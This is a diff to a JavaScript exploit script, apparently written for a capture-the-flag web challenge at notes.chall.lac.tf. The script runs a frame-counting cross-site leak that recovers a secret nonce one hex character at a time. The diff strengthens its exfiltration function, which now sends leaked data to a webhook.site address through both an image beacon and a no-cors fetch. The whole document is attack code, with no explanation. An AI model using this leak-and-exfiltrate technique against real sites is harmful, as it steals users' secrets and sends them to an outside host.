@@ -6,7 +6,16 @@ const CHALL = 'https://notes.chall.lac.tf';
 const WH = 'https://webhook.site/fcbfa7b7-f8f2-42d2-9c53-6f33f061d36d';
 const HEX = '0123456789abcdef';
 
-function exfil(d){ new Image().src = WH + '?d=' + encodeURIComponent(d); }
+// Use multiple exfil methods for reliability
+const imgs = [];
+function exfil(d){
+    // Method 1: Image beacon (keep reference to prevent GC)
+    const img = new Image();
+    img.src = WH + '?d=' + encodeURIComponent(d);
+    imgs.push(img);
+    // Method 2: fetch as backup
+    fetch(WH + '?d=' + encodeURIComponent(d), {mode:'no-cors'}).catch(()=>{});
+}
 
 function testOne(prefix) {
     return new Promise(resolve => {
@@ -33,7 +42,6 @@ function testOne(prefix) {
                     for (let i = 0; i < total; i++) {
                         try { v.contentWindow.frames[i].location = 'about:blank'; } catch(e) {}
                     }
-                    // KEY: wait 2s for about:blank to fully settle in all frames
                     setTimeout(() => {
                         let blk = 0;
                         for (let i = 0; i < total; i++) {
@@ -49,7 +57,6 @@ function testOne(prefix) {
     });
 }
 
-// Race: resolve on first match, but with reliable timing
 function findChar(nonce) {
     return new Promise(resolve => {
         let found = false;
